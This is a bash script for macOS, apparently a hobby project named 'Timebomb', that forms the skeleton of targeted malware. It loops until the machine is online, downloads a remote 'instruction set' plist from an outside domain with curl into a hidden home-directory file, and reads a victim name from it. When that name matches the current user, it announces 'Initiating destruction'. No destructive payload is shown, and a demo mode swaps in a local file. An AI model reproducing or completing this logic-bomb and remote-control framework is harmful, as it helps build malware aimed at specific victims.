#!/bin/bash

# Code is poetry
# Created by Nick aka black.dragon74

# This project was created just for fun!

# Declare Variables
projName="Timebomb by Nick"
remURL="https://lifeisfantas.tk"
userHome=$(echo $HOME)
isElevated="false"
isConnected="no"
plBud="/usr/libexec/PlistBuddy"
plUtil="/usr/bin/plutil"
insSet="$remURL/victim.plist" #Instructions set (remote)
insFile="$userHome/.victim.plist" # Instruction file once fetched
demoMode="yes"
vicName=""

# Declare Functions
function showMessage(){
	messageToShow="$1"
	titleToShow=$projName
	osascript >/dev/null 2>&1 <<-EOF
		display notification "$messageToShow" with title "$titleToShow" sound name "Glass"
	EOF
}

function checkConnection(){
	if ping -c 1 "google.com" &>/dev/null;
		then
		isConnected="yes"
	fi
}

function fetchInstructionSet(){
	echo "Fetching instruction set..."
	curl -o $insFile $insSet &>/dev/null
}

function verifyInsSet(){
	# We will use plist linting to verify
	isFileOK=$($plUtil $insFile | sed 's/^.*: //g')
	if [[ $isFileOK == "OK" ]]; then
		echo "Instruction set is ready for parsing..."
	else
		echo "Instruction set is corrupt. Aborting..."
		exit 1
	fi
}

function parseInsSet(){
	# Parse name
	vicName=$($plBud -c "Print Instructions:Victim\ Name" $insFile | perl -ne 'print lc')
	echo "Parsed Name as: $vicName"
}

function echo_red(){
	echo -e "\033[31m$1\033[0m"
}

# Welcome, friend? enemy? whatever!
echo "###### Timebomb (a fun project) by Nick aka black.dragon74 ######"

# Demo mode handler, if demo mode is set to yes, a different set of declarations are done
if [[ $demoMode == "yes" ]]; then
	echo_red "Running in demo mode..."
	# Override remote file to that of local file when running under demo mode
	insFile=$userHome/Desktop/victim.plist
	echo_red "Using local instruction set at: $insFile"
else
	# Reserved in  case you wish to do any further configurations
	:
fi

# If the computer is not connected, loop until connection is found!
checkConnection
while [[ $isConnected == "no" ]]; do
	echo "Looping every 10 seconds"
	sleep 10 && checkConnection
done

# Fetch the instruction set from remote
# If demo mode is set to yes, instructions set is provided by victim.plist on your desktop
if [[ $demoMode != "yes" ]]; then
	fetchInstructionSet
fi

# Check if the file is OK (not corrupt)
verifyInsSet

# Parse instruction set for program to read and act accordingly
parseInsSet

# Start attack only if the victim name in instrcution set matches to that of victim
if [[ $vicName == "$(whoami | perl -ne 'print lc')" ]]; then
	echo_red "Program running on victim's computer. Initiating destruction..."
else
	echo "Victim is $vicName but program is running on "$(whoami)"'s computer."
	echo "Disarming daemons and the bomb."
	exit 0
fi
